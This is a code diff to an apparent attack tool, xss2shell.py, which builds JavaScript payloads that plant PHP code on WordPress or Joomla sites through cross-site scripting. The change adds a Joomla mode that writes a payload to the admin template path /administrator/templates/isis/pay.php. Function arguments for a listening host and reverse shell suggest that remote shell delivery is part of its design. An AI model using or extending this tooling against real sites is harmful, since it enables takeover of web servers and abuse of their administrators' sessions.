@@ -37,11 +37,16 @@ def help():
   -> Custom php payload (no tags): ./xss2shell.py custom [payload.php]''')
 
 def preparepayload(payload, theme):
-	f = open('footer.php').read()
-	payload = f % (payload, '%s')
-	payload = urllib.quote_plus(payload)
-	f = open('payload.js').read()
-	payload = f % (theme, theme, payload, theme)
+	if theme == 'null':
+		f = open('joomla.js').read()
+		payload = urllib.quote_plus(payload)
+		payload = f % (payload)
+	else:
+		f = open('footer.php').read()
+		payload = f % (payload, '%s')
+		payload = urllib.quote_plus(payload)
+		f = open('wordpress.js').read()
+		payload = f % (theme, theme, payload, theme)
 	open('out.js', 'w').write(payload)
 	print('[+] out.js generated!')
 
@@ -51,7 +56,11 @@ def genpayload(lhost, payload, rshell, theme):
 	preparepayload(payload, theme)
 
 try:
-	theme = raw_input('[!] Enter theme in use: ')
+	if sys.argv[-1].lower() == '--wordpress':
+		theme = raw_input('[!] Enter theme in use: ')
+	elif sys.argv[-1].lower() == '--joomla':
+		theme = 'null'
+		print('[+] Payload Location: /administrator/templates/isis/pay.php')
 	if sys.argv[1].lower() == 'custom':
 		print('[+] Using custom payload: %s' % (sys.argv[2]))
 		payload = open(sys.argv[2]).read()
